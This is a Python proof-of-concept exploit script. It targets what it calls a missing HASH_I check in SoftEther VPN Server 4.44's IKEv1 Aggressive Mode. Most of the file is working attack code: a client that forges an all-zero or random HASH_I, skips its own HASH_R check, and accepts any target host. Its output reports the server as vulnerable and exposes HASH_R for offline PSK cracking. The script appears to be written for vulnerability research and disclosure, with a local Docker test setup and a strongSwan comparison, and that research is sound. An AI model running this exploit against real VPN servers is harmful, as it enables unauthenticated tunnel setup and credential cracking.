#!/usr/bin/env python3
"""
PoC: SoftEther IKEv1 Aggressive Mode — HASH_I Not Verified
===========================================================

Demonstrates that SoftEther VPN Server 4.44 accepts an IKEv1 Aggressive Mode
Phase 1 handshake even when the initiator sends a completely bogus HASH_I
(all-zero bytes), proving SoftEther never authenticates the initiator.

RFC 2409 §5.4 requires the responder to verify HASH_I before completing Phase 1:

    HASH_I = prf(SKEYID, g^xi | g^xr | CKY-I | CKY-R | SAi_b | IDii_b)

where SKEYID is derived from the PSK. A correct responder that doesn't know
the PSK cannot verify HASH_I; a correct responder that DOES know the PSK must
verify it and reject the exchange on mismatch.

SoftEther silently accepts any value in the HASH_I payload.

Impact:
  • Any client can claim any identity and establish a Phase 1 SA without
    knowing the PSK.
  • HASH_R is emitted in the clear in message 2, providing offline cracking
    material to unauthenticated attackers (CVE-equivalent: identity exposure).
  • Depending on SoftEther's Phase 2 / L2TP behaviour this may allow
    unauthenticated tunnel establishment.

Contrast:
  strongSwan detects the bogus HASH_I immediately and responds with an
  AUTHENTICATION-FAILED Informational Notify, rejecting the exchange.

Usage:
    # Start SoftEther container:
    #   cd docker/softether && docker build -t ike-test-softether .
    #   docker run --rm --network host -e SE_PSK=secret ike-test-softether

    python poc_softether_hash_i.py                        # default: 127.0.0.1 PSK=secret
    python poc_softether_hash_i.py --host 192.168.1.10 --psk mypsk
    python poc_softether_hash_i.py --wrong-psk            # prove PSK knowledge not required
    python poc_softether_hash_i.py --random-hash          # random HASH_I, not just zeros
    python poc_softether_hash_i.py --compare 127.0.0.1   # run against strongSwan too
"""

import argparse
import os
import socket
import sys
import time

sys.path.insert(0, os.path.dirname(__file__))
from ike_client import (
    AuthenticationError,
    IKEv1Client,
    IKEv1Config,
    V1_EXCHANGE_AGGRESSIVE,
    V1_FLAG_ENCRYPTION,
    V1_PAYLOAD_HASH,
    V1_PAYLOAD_ID,
    V1_PAYLOAD_KE,
    V1_PAYLOAD_NONE,
    V1_PAYLOAD_NONCE,
    V1_PAYLOAD_SA,
)

BANNER = "=" * 70


# ---------------------------------------------------------------------------
# Subclass: replaces HASH_I with caller-supplied bytes (default: all zeros)
# ---------------------------------------------------------------------------

class BogusHashIClient(IKEv1Client):
    """IKEv1 Aggressive Mode initiator that sends a forged HASH_I."""

    def __init__(self, cfg: IKEv1Config, fake_hash: bytes | None = None,
                 random_hash: bool = False) -> None:
        super().__init__(cfg)
        self._fake_hash   = fake_hash    # explicit bytes; takes precedence
        self._random_hash = random_hash  # True → os.urandom each call

    # Override: return garbage instead of prf(SKEYID, …)
    def _compute_hash_i(self) -> bytes:
        length = self.cfg.hash_info.output_len
        if self._fake_hash is not None:
            return (self._fake_hash + b"\x00" * length)[:length]
        if self._random_hash:
            return os.urandom(length)
        return b"\x00" * length

    # Override: skip HASH_R check so a mismatched PSK doesn't abort the test
    def _verify_hash_r(self, received: bytes) -> None:
        self.log.warn(
            f"[PoC] HASH_R verification skipped — received: {received.hex()}"
        )

    def run_poc(self) -> dict:
        """
        Execute Aggressive Mode with a bogus HASH_I, then wait up to 2 s for
        an error Notify from the responder.

        Returns a dict:
          msg2_received  – bool: did the server respond to message 1?
          hash_i_sent    – hex string of what was sent as HASH_I
          accepted       – bool: True if server did not reject (vulnerable)
          error_pkt      – hex of error packet if server rejected, else None
        """
        result: dict = {
            "host": self.cfg.host,
            "psk_used": self.cfg.psk,
            "msg2_received": False,
            "hash_i_sent": None,
            "accepted": False,
            "error_pkt": None,
        }

        self._generate_dh_keypair()
        self.nonce_i = os.urandom(16)

        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.settimeout(self.cfg.timeout)

        try:
            # ── Message 1: SA + KE + Ni + IDii ──────────────────────────────
            self.log.set_phase("AGG-INIT")

            self.sa_payload_bytes = self._build_sa_payload_v1(V1_PAYLOAD_NONE)
            sa_pld    = self._build_sa_payload_v1(V1_PAYLOAD_KE)
            ke_pld    = self._build_generic_v1(V1_PAYLOAD_NONCE, self.dh_pub,
                                               ptype=V1_PAYLOAD_KE)
            nonce_pld = self._build_generic_v1(V1_PAYLOAD_ID, self.nonce_i,
                                               ptype=V1_PAYLOAD_NONCE)
            idi_pld   = self._build_id_payload_v1(V1_PAYLOAD_NONE, self.cfg.id_local)
            self.idi_payload_bytes = idi_pld

            payloads = sa_pld + ke_pld + nonce_pld + idi_pld
            pkt1 = self._build_isakmp_header(
                V1_EXCHANGE_AGGRESSIVE, 0, 0, V1_PAYLOAD_SA, 28 + len(payloads)
            ) + payloads
            self.log.info(f"→ Msg 1 ({len(pkt1)}B): SA + KE + Ni + IDii")

            # ── Receive message 2 ────────────────────────────────────────────
            resp2 = self._send_recv_v1(pkt1)
            result["msg2_received"] = True
            self.log.info(f"← Msg 2 ({len(resp2)}B): received from server")

            self._parse_agg_msg2(resp2)   # sets peer_dh_pub, nonce_r, cookie_r, …

            # ── Key derivation ───────────────────────────────────────────────
            self.log.set_phase("AGG-KEYS")
            self._derive_keys_v1()        # calls _verify_hash_r (overridden → no-op)

            # ── Build bogus HASH_I ───────────────────────────────────────────
            self.log.set_phase("AGG-AUTH")
            bogus = self._compute_hash_i()
            result["hash_i_sent"] = bogus.hex()
            mode_tag = "random" if self._random_hash else "all-zero"
            self.log.warn(f"[PoC] HASH_I forged ({mode_tag}): {bogus.hex()}")

            hash_pld = self._build_generic_v1(V1_PAYLOAD_NONE, bogus)
            ct, _    = self._encrypt_v1(hash_pld, self.phase1_iv)
            pkt3     = self._build_isakmp_header(
                V1_EXCHANGE_AGGRESSIVE, V1_FLAG_ENCRYPTION, 0,
                V1_PAYLOAD_HASH, 28 + len(ct)
            ) + ct
            self.log.info(f"→ Msg 3 ({len(pkt3)}B): HASH_I [FORGED / {mode_tag}]")

            # Send msg 3, then wait briefly for an error Notify
            self._sock.sendto(pkt3, (self.cfg.host, self.cfg.port))
            self._sock.settimeout(2.0)
            try:
                err_pkt, _ = self._sock.recvfrom(65535)
                result["error_pkt"] = err_pkt.hex()
                # Exchange type 5 = Informational (error Notify)
                # ISAKMP header: CookieI(8) CookieR(8) next(1) version(1) exch(1) …
                exch = err_pkt[18] if len(err_pkt) >= 19 else 0
                if exch == 5:
                    self.log.warn("[PoC] Server sent Informational Notify → REJECTED")
                    result["accepted"] = False
                else:
                    self.log.info("[PoC] Server sent non-error packet → treating as ACCEPTED")
                    result["accepted"] = True
            except socket.timeout:
                self.log.info("[PoC] No error response within 2 s → ACCEPTED (silent)")
                result["accepted"] = True

        finally:
            self._sock.close()
            self._sock = None

        return result


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run_target(host: str, psk: str, dh_group: int, verbose: bool,
                random_hash: bool = False) -> dict:
    cfg = IKEv1Config(
        host=host,
        mode="aggressive",
        encr="aes-cbc-256",
        hash_alg="sha1",
        dh_group=dh_group,
        psk=psk,
        verbose=verbose,
    )
    return BogusHashIClient(cfg, random_hash=random_hash).run_poc()


def _print_result(label: str, result: dict) -> None:
    print(f"\n{BANNER}")
    print(f"  RESULT — {label}")
    print(BANNER)
    if not result["msg2_received"]:
        print("  [NO RESPONSE] Server did not reply to message 1 (is it running?)")
        return
    if result["accepted"]:
        hi = result["hash_i_sent"] or ""
        is_zero = hi == "00" * (len(hi) // 2)
        hi_desc = "all zeros" if is_zero else "random bytes"
        print(f"  [VULNERABLE] Phase 1 ACCEPTED with {hi_desc} HASH_I")
        print()
        print(f"    host     : {result['host']}")
        print(f"    PSK used : {result['psk_used']!r}")
        print(f"    HASH_I   : {hi} ({hi_desc})")
        print()
        print("  The responder never verified the initiator's identity.")
        print("  An attacker with no knowledge of the PSK can establish")
        print("  a Phase 1 SA and obtain HASH_R for offline cracking.")
    else:
        print("  [NOT VULNERABLE] Server rejected the bogus HASH_I")
        if result["error_pkt"]:
            print(f"    Error packet (hex): {result['error_pkt'][:80]}…")
    print(BANNER)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="PoC: SoftEther IKEv1 Aggressive Mode HASH_I not verified",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--host",      default="127.0.0.1",
                        help="SoftEther host (default: 127.0.0.1)")
    parser.add_argument("--psk",       default="secret",
                        help="PSK configured on the server (used to derive encryption "
                             "keys for msg 3; does NOT affect whether HASH_I is valid)")
    parser.add_argument("--dh-group",  type=int, default=14,
                        help="DH group (default: 14 = MODP-2048)")
    parser.add_argument("--wrong-psk", action="store_true",
                        help="Use a completely wrong PSK to prove PSK knowledge is "
                             "not required for Phase 1 acceptance")
    parser.add_argument("--random-hash", action="store_true",
                        help="Send random bytes as HASH_I instead of all zeros, "
                             "ruling out any special-case handling of the zero value")
    parser.add_argument("--compare",   metavar="STRONGSWAN_HOST",
                        help="Also run against a strongSwan host at this address and "
                             "compare results (strongSwan SHOULD reject)")
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()

    psk         = "definitely_not_the_psk_xyzzy_12345" if args.wrong_psk else args.psk
    random_hash = args.random_hash
    hash_desc   = "random bytes (os.urandom)" if random_hash else "all zeros (0x00…)"

    print(BANNER)
    print("  PoC: SoftEther IKEv1 Aggressive Mode — HASH_I Not Verified")
    print(BANNER)
    print()
    print("  RFC 2409 §5.4 requires the responder to verify HASH_I before")
    print("  completing Phase 1. SoftEther 4.44 never checks this value.")
    print()
    print(f"  Target      : {args.host}:500")
    print(f"  PSK in use  : {psk!r}")
    print(f"  HASH_I sent : <{hash_desc}>")
    if args.wrong_psk:
        print()
        print("  NOTE: --wrong-psk mode — even the encryption keys are derived")
        print("  from the wrong PSK. SoftEther still cannot tell the difference.")
    if random_hash:
        print()
        print("  NOTE: --random-hash mode — HASH_I is freshly randomised each run,")
        print("  ruling out any special-case handling of the all-zero value.")
    print()

    # ── Test against SoftEther ───────────────────────────────────────────────
    print(f"Running exchange against SoftEther at {args.host} …")
    try:
        se_result = _run_target(args.host, psk, args.dh_group, args.verbose, random_hash)
    except Exception as exc:
        print(f"[ERROR] {exc}")
        sys.exit(2)

    _print_result(f"SoftEther ({args.host})", se_result)

    # ── Optionally test against strongSwan for comparison ────────────────────
    ss_result: dict | None = None
    if args.compare:
        print(f"\nRunning comparison exchange against strongSwan at {args.compare} …")
        try:
            ss_result = _run_target(args.compare, psk, args.dh_group, args.verbose, random_hash)
        except Exception as exc:
            print(f"[ERROR] strongSwan comparison failed: {exc}")

    if ss_result is not None:
        _print_result(f"strongSwan ({args.compare})", ss_result)

        print(f"\n{BANNER}")
        print("  COMPARISON SUMMARY")
        print(BANNER)
        se_verdict = "VULNERABLE (accepted)"  if se_result["accepted"] else "patched (rejected)"
        ss_verdict = "VULNERABLE (accepted)" if ss_result["accepted"] else "not vulnerable (rejected)"
        print(f"  SoftEther  {args.host:20s} : {se_verdict}")
        print(f"  strongSwan {args.compare:20s} : {ss_verdict}")
        print(BANNER)

    sys.exit(0 if se_result["accepted"] else 1)


if __name__ == "__main__":
    main()
